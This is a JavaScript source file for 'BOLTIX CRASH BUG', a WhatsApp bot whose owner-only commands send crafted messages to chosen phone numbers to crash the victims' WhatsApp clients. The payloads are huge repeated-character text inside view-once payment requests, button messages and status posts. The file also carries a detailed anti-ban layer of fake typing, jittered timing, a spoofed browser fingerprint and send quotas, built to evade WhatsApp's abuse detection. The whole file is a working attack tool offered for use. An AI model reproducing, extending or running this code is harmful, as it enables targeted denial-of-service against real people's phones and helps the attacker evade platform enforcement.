'use strict';

const fs   = require('fs');
const path = require('path');
const pkg  = require('./package.json');
const express = require('express');
const QRCode  = require('qrcode');
const pino    = require('pino');
const { Boom } = require('@hapi/boom');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  jidNormalizedUser,
  DisconnectReason,
  getContentType,
  Browsers,
} = require('@whiskeysockets/baileys');

/* ============================================================
   CONFIG
============================================================ */
const logger      = pino({ level: 'silent' });
const SESSION_DIR = path.join(__dirname, 'sessions');
const CRASH_CHAR  = 'ꦾ';
const PREFIX      = '.';
const PORT        = process.env.PORT || 3000;

function normalizeOwnerNumber(input) {
  let num = String(input || '').replace(/[^0-9]/g, '');
  if (!num) return null;
  if (num.startsWith('0') && num.length === 11) num = '234' + num.slice(1);
  if (!/^\d{8,15}$/.test(num)) return null;
  return num;
}

const OWNER_NUMBER = normalizeOwnerNumber(process.env.OWNER_NUMBER) || '2348163201351';

// Pairing rate limits
const PAIR_RATE_MS    = 10000;
const PAIR_MAX_PER_MIN = 5;
const QR_MAX_PER_MIN   = 40;

const STARTUP_TIMEOUT_MS = 60000;

/* ============================================================
   ANTI-BAN CONFIG
   Behavioral simulation to reduce automated-spam flags.
   These reduce risk from protocol/timing signals. They CANNOT
   prevent bans from user reports, number age, or IP reputation.
============================================================ */
const ANTIBAN = {
  // Jittered gap between ANY two outbound messages (jitter defeats
  // the predictable mathematical cadence that flags bots)
  MIN_GAP:  Number(process.env.AB_MIN_GAP || 3000),
  MAX_GAP:  Number(process.env.AB_MAX_GAP || 10000),

  // Longer human-style pause after every batch of sends
  BATCH_SIZE:       15,
  BATCH_PAUSE_MIN:   25000,   // 25s
  BATCH_PAUSE_MAX:   45000,   // 45s

  // Total outbound safety caps per day (midnight-local reset)
  DAILY_MAX:            Number(process.env.AB_DAILY_MAX || 300),
  PROACTIVE_DAILY_MAX:  Number(process.env.AB_PROACTIVE_DAILY || 60),

  // Read-receipt & typing simulation
  READ_DELAY_MIN: 800,
  READ_DELAY_MAX: 2000,
  PRESENCE_DELAY_MIN: 400,
  PRESENCE_DELAY_MAX: 1000,
  TYPE_MS_PER_CHAR: 45,
  TYPE_MIN: 1500,
  TYPE_MAX: 7000,

  // Warm-up after a FRESH pairing: a brand-new link sending
  // immediately is a classic new-device/new-client red flag.
  WARMUP_AFTER_PAIRING: 5 * 60 * 1000,   // 5 minutes

  // How recently a JID must have messaged us to count as an
  // "active thread" (replying there is far safer than cold sends)
  THREAD_WINDOW: 24 * 60 * 60 * 1000,
};

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

/* ============================================================
   STATE
============================================================ */
let sock          = null;
let qrText        = null;
let pairingCode   = null;
let pairingNumber = null;
let connected     = false;
let booting       = false;
let userJid       = null;
let lastPairingAt = 0;

// Outbound queue state (anti-ban)
let sendChain   = Promise.resolve();
let lastSentAt  = 0;
let sentToday   = 0;
let proactiveToday = 0;
let batchCount  = 0;
let dayStamp    = new Date().toDateString();
let sendReadyAt = 0;   // warm-up gate (set after a fresh pairing)

// Inbound ledger: number → last time they messaged the bot.
// Lets us distinguish replies (safe) from cold/proactive sends (risky).
const inboundLedger = new Map();

// Connection state machine
let connState = 'boot';

// Rate-limit tracking
let pairAttempts = [];
let qrAttempts    = [];

// Reconnect control
let reconnectTimer    = null;
let reconnectAttempts = 0;
let startupTimer      = null;

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

/* ============================================================
   ANTI-BAN: serialized outbound queue with jitter, batch pauses,
   daily caps, proactive quotas, and warm-up gating.

   Every outbound WhatsApp message goes through here — including
   command replies — so the account's overall send cadence always
   looks human, no matter which code path triggered the send.
============================================================ */
function rollDay() {
  const d = new Date().toDateString();
  if (d !== dayStamp) {
    dayStamp = d;
    sentToday = 0;
    proactiveToday = 0;
  }
}

/* proactive=true → outbound to someone who hasn't recently messaged us
   (crash sends, cold outreach). proactive=false → an in-thread reply. */
function enqueueSend(fn, opts = {}) {
  const { proactive = false } = opts;
  const run = sendChain.then(async () => {
    rollDay();

    if (sentToday >= ANTIBAN.DAILY_MAX)
      throw new Error('daily-send-cap');
    if (proactive && proactiveToday >= ANTIBAN.PROACTIVE_DAILY_MAX)
      throw new Error('proactive-send-cap');

    // Warm-up: block proactive sends right after fresh pairing so the
    // account doesn't behave like an eager new automated client.
    if (proactive && Date.now() < sendReadyAt) {
      const wait = sendReadyAt - Date.now();
      if (wait > 30000) throw new Error('warmup');
      await sleep(wait);
    }

    // Jittered inter-send gap (fixed intervals are a bot fingerprint)
    const target = rand(ANTIBAN.MIN_GAP, ANTIBAN.MAX_GAP);
    const gap = Date.now() - lastSentAt;
    if (gap < target) await sleep(target - gap);

    // Periodic longer pause after a batch — humans chat in bursts, not streams
    if (batchCount > 0 && batchCount % ANTIBAN.BATCH_SIZE === 0) {
      await sleep(rand(ANTIBAN.BATCH_PAUSE_MIN, ANTIBAN.BATCH_PAUSE_MAX));
    }

    const result = await fn();

    sentToday++;
    if (proactive) proactiveToday++;
    batchCount++;
    lastSentAt = Date.now();
    return result;
  });
  // keep the chain alive even if one task rejects
  sendChain = run.then(() => {}, () => {});
  return run;
}

/* ============================================================
   BOLTIX CRASH MECHANISMS
============================================================ */
function clampSize(val, fallback) {
  const n = parseInt(val, 10);
  if (!Number.isFinite(n)) return fallback;
  return Math.min(Math.max(n, 5000), 60000);
}

const HUGE        = clampSize(process.env.OVERFLOW, 45000);
const STATUS_SIZE = clampSize(null, 30000);

function bigText(n = HUGE) {
  return '⚡ BOLTIX CRASH ☠\n' + CRASH_CHAR.repeat(n);
}

function chatOpenCrash(victimJid) {
  return {
    viewOnceMessageV2: {
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 9999999,
          requestFrom: victimJid,
          noteMessage: {
            extendedTextMessage: {
              text: bigText(),
              canonicalUrl: 'boltix-crash'
            }
          }
        }
      }
    }
  };
}

function buttonCrash() {
  return {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: '⚡ *BOLTIX CRASH — TAP* ⚡' },
          nativeFlowMessage: {
            buttons: [{
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: '⚡ BOLTIX 💥',
                id: CRASH_CHAR.repeat(Math.min(28000, HUGE))
              })
            }]
          }
        }
      }
    }
  };
}

function statusCrash() {
  return {
    viewOnceMessageV2: {
      message: {
        extendedTextMessage: {
          text: bigText(STATUS_SIZE),
          canonicalUrl: 'boltix-crash'
        }
      }
    }
  };
}

/* ============================================================
   HELPERS
============================================================ */
function jidToNumber(jid) {
  if (!jid) return null;
  const raw = String(jid).split('@')[0].split(':')[0];
  const digits = raw.replace(/[^0-9]/g, '');
  return digits || null;
}

function isOwner(m) {
  const sender = m.key.participant || m.key.remoteJid;
  return jidToNumber(sender) === OWNER_NUMBER;
}

function isOwnerNumber(num) {
  return String(num) === OWNER_NUMBER;
}

function normalizeNumber(arg) {
  let num = String(arg || '').replace(/[^0-9]/g, '');
  if (!num) return null;
  if (num.startsWith('0') && num.length === 11) num = '234' + num.slice(1);
  if (!/^\d{8,15}$/.test(num)) return null;
  return num;
}

async function toJid(arg) {
  const num = normalizeNumber(arg);
  if (!num) return null;

  if (isOwnerNumber(num)) return 'OWNER_PROTECTED';

  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const [res] = await sock.onWhatsApp(num);
      if (res?.jid) return jidNormalizedUser(res.jid);
      if (res !== undefined) return null;
    } catch (e) {
      console.error('[jid] lookup attempt failed:', e?.message);
    }
    if (attempt === 0) await sleep(rand(1200, 1800));
  }

  console.error('[jid] lookup unconfirmed for supplied number');
  return null;
}

/* Does this JID have a recent inbound thread with us? */
function isRecentThread(jid) {
  const num = jidToNumber(jid);
  if (!num) return false;
  const last = inboundLedger.get(num);
  return !!last && (Date.now() - last) < ANTIBAN.THREAD_WINDOW;
}

function recordInbound(m) {
  if (m.key.fromMe) return;
  const num = jidToNumber(m.key.participant || m.key.remoteJid);
  if (num) inboundLedger.set(num, Date.now());

  // prune stale entries occasionally
  if (inboundLedger.size > 500) {
    const cutoff = Date.now() - ANTIBAN.THREAD_WINDOW * 2;
    for (const [k, v] of inboundLedger) if (v < cutoff) inboundLedger.delete(k);
  }
}

const userCrashLog = new Map();

function canUserCrash(jid) {
  const key = jidToNumber(jid) || jid;
  const now = Date.now();
  const WINDOW = 60 * 1000;
  const MAX_PER_MIN = 15;

  const recent = (userCrashLog.get(key) || []).filter(t => now - t < WINDOW);
  if (recent.length >= MAX_PER_MIN) return false;

  recent.push(now);
  userCrashLog.set(key, recent);

  if (userCrashLog.size > 100) {
    for (const [k, v] of userCrashLog) {
      if (v.length === 0 || now - v[v.length - 1] > WINDOW * 5) userCrashLog.delete(k);
    }
  }
  return true;
}

/* ============================================================
   ANTI-BAN: human-like reply pipeline.
   Read receipt → presence subscribe → typing indicator
   (proportional to reply length) → paused → send.
   All inside the serialized queue so overall cadence stays human.
============================================================ */
function humanReply(m, text) {
  const from = m.key.remoteJid;
  return enqueueSend(async () => {
    try {
      // 1. simulate noticing and reading the incoming message
      await sleep(rand(ANTIBAN.READ_DELAY_MIN, ANTIBAN.READ_DELAY_MAX));
      await sock.readMessages([m.key]).catch(() => {});

      // 2. typing presence, proportional to reply length
      try {
        await sock.presenceSubscribe(from);
        await sleep(rand(ANTIBAN.PRESENCE_DELAY_MIN, ANTIBAN.PRESENCE_DELAY_MAX));
        await sock.sendPresenceUpdate('composing', from);
        const typing = Math.min(
          Math.max(text.length * ANTIBAN.TYPE_MS_PER_CHAR, ANTIBAN.TYPE_MIN),
          ANTIBAN.TYPE_MAX
        );
        await sleep(typing);
        await sock.sendPresenceUpdate('paused', from);
      } catch (_) { /* presence is best-effort */ }

      await sock.sendMessage(from, { text }, { quoted: m });
    } catch (e) {
      console.error('[reply] error:', e?.message);
    }
  }, { proactive: false }); // replies are in-thread → low risk
}

/* Crash sends are proactive (cold) — flagged for the stricter quota. */
function safeSend(jid, payload, opts, label) {
  return enqueueSend(async () => {
    try {
      await sock.sendMessage(jid, payload, opts);
      return `✅ ${label} sent`;
    } catch (e) {
      console.error(`[${label}]`, e?.message);
      return `❌ ${label} failed — try again`;
    }
  }, { proactive: !isRecentThread(jid) });
}

function safeSendStatus(jid, payload, opts) {
  return enqueueSend(async () => {
    try {
      await sock.sendMessage('status@broadcast', payload, opts);
      return '✅ Boltix Crash 3 sent (status)';
    } catch (e) {
      console.error('[crash3]', e?.message);
      return '❌ Boltix Crash 3 failed — try again';
    }
  }, { proactive: !isRecentThread(jid) });
}

function getText(msg) {
  const t = getContentType(msg);
  if (!t) return '';
  switch (t) {
    case 'conversation':        return msg.conversation;
    case 'extendedTextMessage': return msg.extendedTextMessage?.text || '';
    default:                   return msg[t]?.caption || msg[t]?.text || '';
  }
}

/* ============================================================
   COMMANDS — owner-only crash commands
============================================================ */
async function handleCommand(m) {
  if (!m.message || m.key.fromMe) return;

  let text = '';
  try { text = getText(m.message); } catch (_) { return; }
  if (!text || text.length > 4000) return;
  if (!text.startsWith(PREFIX)) return;

  const parts = text.slice(1).trim().split(/\s+/);
  const cmd   = (parts[0] || '').toLowerCase();
  const arg   = parts[1];

  const reply = (t) => humanReply(m, t);

  try {
    switch (cmd) {

      case 'help':
      case 'menu':
        await reply(
`⚡ *BOLTIX CRASH BUG* ⚡

*${PREFIX}crash1 <number>* → chat-open crash
*${PREFIX}crash2 <number>* → button crash
*${PREFIX}crash3 <number>* → status crash
*${PREFIX}all <number>*    → all three
*${PREFIX}ping* | *${PREFIX}me* | *${PREFIX}stats*

_Owner-only commands._ Numbers must be on WhatsApp.`);
        break;

      case 'ping':
        await reply(`⚡ BOLTIX alive | v${pkg.version}`);
        break;

      case 'me':
        await reply(isOwner(m) ? '✅ You are the owner.' : '❌ Not authorized.');
        break;

      case 'stats': {
        if (!isOwner(m)) { await reply('❌ Not authorized.'); break; }
        rollDay();
        const warm = Date.now() < sendReadyAt
          ? `⏳ warm-up: ${Math.ceil((sendReadyAt - Date.now()) / 1000)}s left`
          : '✅ warm-up done';
        await reply(
`📊 *Anti-ban status*

📤 Sent today: ${sentToday}/${ANTIBAN.DAILY_MAX}
🎯 Proactive today: ${proactiveToday}/${ANTIBAN.PROACTIVE_DAILY_MAX}
🧵 Active threads: ${inboundLedger.size}
${warm}`);
        break;
      }

      case 'crash1':
      case 'crash2':
      case 'crash3':
      case 'all': {
        if (!isOwner(m)) { await reply('❌ Not authorized. Owner only.'); break; }
        if (!canUserCrash(m.key.participant || m.key.remoteJid)) {
          await reply('⏳ Rate limited — wait a moment.');
          break;
        }
        rollDay();
        if (sentToday >= ANTIBAN.DAILY_MAX) {
          await reply(`🧊 Daily send cap reached (${ANTIBAN.DAILY_MAX}) — resumes tomorrow.`);
          break;
        }
        if (proactiveToday >= ANTIBAN.PROACTIVE_DAILY_MAX) {
          await reply(`🧊 Proactive send cap reached (${ANTIBAN.PROACTIVE_DAILY_MAX}) — resumes tomorrow.`);
          break;
        }
        if (Date.now() < sendReadyAt) {
          await reply(`⏳ Account warm-up in progress — ~${Math.ceil((sendReadyAt - Date.now()) / 60000)} min left.`);
          break;
        }

        if (!arg) { await reply(`Usage: ${PREFIX}${cmd} <number>`); break; }

        const jid = await toJid(arg);
        if (jid === 'OWNER_PROTECTED') { await reply('🛡 Cannot attack owner number.'); break; }
        if (!jid) { await reply('❌ Number not confirmed on WhatsApp.'); break; }

        if (cmd === 'crash1' || cmd === 'all')
          await reply(await safeSend(jid, chatOpenCrash(jid), {}, 'Boltix Crash 1'));

        if (cmd === 'crash2' || cmd === 'all')
          await reply(await safeSend(jid, buttonCrash(), {}, 'Boltix Crash 2'));

        if (cmd === 'crash3' || cmd === 'all')
          await reply(await safeSendStatus(jid, statusCrash(), {
            backgroundColor: '#000000',
            font: 3,
            statusJidList: [jid]
          }));

        break;
      }
    }
  } catch (e) {
    console.error('[cmd] error:', e?.message);
  }
}

/* ============================================================
   BAILEYS — connection lifecycle
============================================================ */
function scheduleReconnect(waitMs) {
  if (reconnectTimer) clearTimeout(reconnectTimer);
  reconnectTimer = setTimeout(async () => {
    reconnectTimer = null;
    await start();
  }, waitMs);
}

async function start() {
  if (booting) return;
  booting = true;

  // Detect a FRESH session (no creds file) — pairing just happened or
  // is about to. Used to apply the post-pairing warm-up once.
  const freshSession = !fs.existsSync(path.join(SESSION_DIR, 'creds.json'));

  if (startupTimer) clearTimeout(startupTimer);
  startupTimer = setTimeout(() => {
    if (booting && !connected) {
      console.error('[start] startup timeout — forcing cleanup and retry');
      booting = false;
      try { sock?.end?.(new Error('startup timeout')); } catch (_) {}
      scheduleReconnect(5000);
    }
    startupTimer = null;
  }, STARTUP_TIMEOUT_MS);

  try {
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      logger,

      // ANTI-BAN: realistic desktop browser fingerprint instead of a
      // custom bot string. WhatsApp inspects this tuple during the
      // Noise handshake and flags unusual client types.
      browser: Browsers.macOS('Chrome'),

      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, logger)
      },

      // ANTI-BAN: don't permanently show "online" (looks like a bot
      // that never sleeps); presence is set explicitly when replying
      markOnlineOnConnect: false,

      // ANTI-BAN: don't sync full history — a full initial burst of
      // history messages right after pairing looks anomalous
      syncFullHistory: false,

      generateHighQualityLinkPreview: false,
      cachedGroupMetadata: async () => undefined
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (u) => {
      const { connection, lastDisconnect, qr, receivedPendingNotifications } = u;

      if (qr) {
        qrText = qr;
        if (connState !== 'waiting_qr') {
          connState = 'waiting_qr';
          console.log('[pair] QR available for scanning');
        }
      }

      if (connection === 'connecting') connState = 'connecting';

      if (connection === 'open') {
        if (startupTimer) { clearTimeout(startupTimer); startupTimer = null; }
        booting = false;
        connected = true;
        reconnectAttempts = 0;
        connState = 'connected';
        qrText = null;
        pairingCode = null;
        pairingNumber = null;
        userJid = jidNormalizedUser(sock.user.id);

        // ANTI-BAN: post-pairing warm-up. Only applied when this
        // connection came from a FRESH pairing, not on routine
        // reconnects (reconnects use stable session metadata —
        // frequent key resets are themselves a flag we avoid).
        if (freshSession && sendReadyAt === 0) {
          sendReadyAt = Date.now() + ANTIBAN.WARMUP_AFTER_PAIRING;
          console.log(`[antiban] fresh pairing — proactive sends paused for ${ANTIBAN.WARMUP_AFTER_PAIRING / 60000} min warm-up`);
        }

        console.log('[pair] connected as bot account');
      }

      if (connection === 'close') {
        if (startupTimer) { clearTimeout(startupTimer); startupTimer = null; }

        connected = false;
        userJid = null;
        qrText = null;
        pairingCode = null;
        pairingNumber = null;
        booting = false;

        const code = new Boom(lastDisconnect?.error)?.output?.statusCode;

        if (code === DisconnectReason.loggedOut) {
          console.log('[pair] logged out — wiping session for fresh start');
          connState = 'disconnected';
          sendReadyAt = 0;  // new pairing → warm-up applies again
          try { fs.rmSync(SESSION_DIR, { recursive: true, force: true }); } catch (_) {}
          fs.mkdirSync(SESSION_DIR, { recursive: true });
          scheduleReconnect(3000);
          return;
        }

        connState = 'reconnecting';

        const isSessionRestart = code === 515 || code === 428;
        const base  = isSessionRestart ? 500 : 2000;
        const wait  = Math.min(60000, base * Math.pow(2, reconnectAttempts));
        reconnectAttempts++;
        if (reconnectAttempts > 10) reconnectAttempts = 10;

        console.log(`[pair] disconnected (code ${code}), reconnect #${reconnectAttempts} in ${wait}ms`);
        scheduleReconnect(wait);
      }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
      if (type !== 'notify') return;
      for (const m of messages) {
        // ANTI-BAN: record inbound threads (drives the proactive
        // classification and outbound-to-inbound ratio awareness)
        recordInbound(m);
        try { await handleCommand(m); }
        catch (e) { console.error('[msg] error:', e?.message); }
      }
    });

  } catch (e) {
    console.error('[start] initialization error:', e?.message);
    booting = false;
    if (startupTimer) { clearTimeout(startupTimer); startupTimer = null; }
    scheduleReconnect(5000);
  }
}

process.on('unhandledRejection', e => console.error('[unhandled]', e?.message));
process.on('uncaughtException', e => {
  console.error('[uncaught] fatal — exiting for clean restart:', e?.message);
  process.exit(1);
});

/* ============================================================
   WEB — serves index.html from the REPO ROOT
   (falls back to public/index.html if that folder layout is used)
============================================================ */
const app = express();
app.use(express.json());

function makeLimiter(bucket, maxPerMin, message) {
  return (_req, res, next) => {
    const now = Date.now();
    bucket = bucket.filter(t => now - t < 60000);
    if (bucket.length >= maxPerMin) {
      return res.status(429).json({ error: message });
    }
    bucket.push(now);
    next();
  };
}

const qrLimiter   = makeLimiter(qrAttempts,  QR_MAX_PER_MIN,  'Too many QR requests.');
const pairLimiter = makeLimiter(pairAttempts, PAIR_MAX_PER_MIN, 'Too many attempts. Wait a minute.');

function maskJid(jid) {
  if (!jid) return null;
  const num = jidToNumber(jid);
  if (!num || num.length < 4) return '***';
  return num.slice(0, 2) + '***' + num.slice(-2);
}

/* ---- Static file resolution ----
   Priority:
   1. index.html in the repo ROOT (next to index.js)
   2. public/index.html            (legacy layout, kept as fallback)
   Resolved at REQUEST time, not boot time, so file changes
   after boot (or a later deploy) require no restart. */
const ROOT_HTML   = path.join(__dirname, 'index.html');
const PUBLIC_DIR  = path.join(__dirname, 'public');
const PUBLIC_HTML = path.join(PUBLIC_DIR, 'index.html');

function findIndexHtml() {
  if (fs.existsSync(ROOT_HTML))   return ROOT_HTML;
  if (fs.existsSync(PUBLIC_HTML)) return PUBLIC_HTML;
  return null;
}

function sendIndex(res) {
  const file = findIndexHtml();
  if (!file) {
    return res
      .status(500)
      .send('<h1>BOLTIX — dashboard missing</h1><p>Place index.html in the repo root, next to index.js.</p>');
  }
  res.sendFile(file);
}

// Root route → resolve index.html at request time
app.get('/', (_req, res) => sendIndex(res));

// Static assets (css/js/img placed next to index.html in the root)
app.use(express.static(__dirname, {
  index: false,                       // '/' handled explicitly above
  setHeaders(res, filePath) {
    // never cache the dashboard itself
    if (filePath === ROOT_HTML || filePath === PUBLIC_HTML) {
      res.setHeader('Cache-Control', 'no-cache');
    }
  },
}));
// Legacy public/ folder fallback (no-op if the folder doesn't exist)
app.use(express.static(PUBLIC_DIR, { index: false }));

/* Authoritative connection state for the frontend. */
app.get('/api/state', (_req, res) => {
  res.json({
    connected,
    state: connState,
    user: connected ? maskJid(userJid) : null
  });
});

app.get('/api/qr', qrLimiter, async (_req, res) => {
  if (!qrText) return res.json({ qr: null });
  try {
    res.json({ qr: await QRCode.toDataURL(qrText, { margin: 1, width: 360 }) });
  } catch {
    res.json({ qr: null });
  }
});

app.post('/api/pair', pairLimiter, async (req, res) => {
  if (connected) return res.status(400).json({ error: 'Already connected.' });
  if (!sock)     return res.status(503).json({ error: 'Booting, retry shortly.' });

  const number = normalizeNumber(req.body?.number);
  if (!number) return res.status(400).json({ error: 'Invalid number format.' });

  if (pairingCode && pairingNumber === number && Date.now() - lastPairingAt < 90000)
    return res.json({ code: pairingCode });

  if (Date.now() - lastPairingAt < PAIR_RATE_MS)
    return res.status(429).json({ error: 'Please wait a few seconds between requests.' });

  if (!qrText) return res.status(425).json({ error: 'QR not ready — retry in ~5s.' });

  try {
    pairingCode = await sock.requestPairingCode(number);
    pairingNumber = number;
    lastPairingAt = Date.now();
    console.log('[pair] pairing code generated (code not logged)');
    res.json({ code: pairingCode });
  } catch (e) {
    console.error('[pair] error:', e?.message);
    res.status(500).json({ error: 'Pairing failed — try again.' });
  }
});

app.listen(PORT, () => {
  console.log('[web] BOLTIX CRASH BUG listening on port', PORT);

  // Boot-time sanity check so a missing file is obvious in Render logs
  const html = findIndexHtml();
  if (html) {
    console.log('[web] dashboard served from:', html);
  } else {
    console.warn('[web] ⚠ index.html NOT found in repo root or public/ — dashboard will show an error page');
  }

  start();
});
